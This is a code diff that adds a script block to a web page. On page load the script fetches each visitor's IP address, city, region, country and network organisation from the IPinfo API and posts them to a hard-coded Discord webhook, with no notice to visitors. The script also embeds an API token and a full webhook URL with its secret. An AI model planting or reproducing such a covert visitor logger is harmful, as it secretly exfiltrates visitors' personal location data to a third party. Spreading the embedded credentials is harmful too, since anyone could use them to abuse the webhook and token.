@@ -1,0 +1,42 @@
+<script>
+  // IPinfo.io API token
+  const apiKey = '6f609cfc9e5326';  // Replace with your IPinfo API key
+
+  // Discord webhook URL (replace with your actual webhook URL)
+  const webhookURL = 'https://discord.com/api/webhooks/1338567908896542768/Y3rwmCvW8cF2C8ov2KXFx5t8Bk62tzPhMch8du265f-wH_eCUn6KgNYKsSNMBTlQnUCG';
+
+  // Function to fetch IP info and send to Discord webhook
+  function logVisitor() {
+    // Fetch IP info from IPinfo API
+    fetch(`https://ipinfo.io?token=${apiKey}`)
+      .then(response => response.json())  // Parse the response as JSON
+      .then(ipData => {
+        const embedData = {
+          "embeds": [{
+            "title": "New Visitor",
+            "description": `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}\nOrg: ${ipData.org}`,
+            "color": 3066993,  // Green color for embed
+          }]
+        };
+
+        // Send IP data to Discord via Webhook
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(embedData)
+        })
+          .then(() => {
+            console.log('Data sent.');
+          })
+          .catch((error) => {
+            console.error('Error sending data.', error);
+          });
+      })
+      .catch((error) => {
+        console.error('Error fetching IP data.', error);
+      });
+  }
+
+  // Call logVisitor function on page load
+  logVisitor();
+</script>
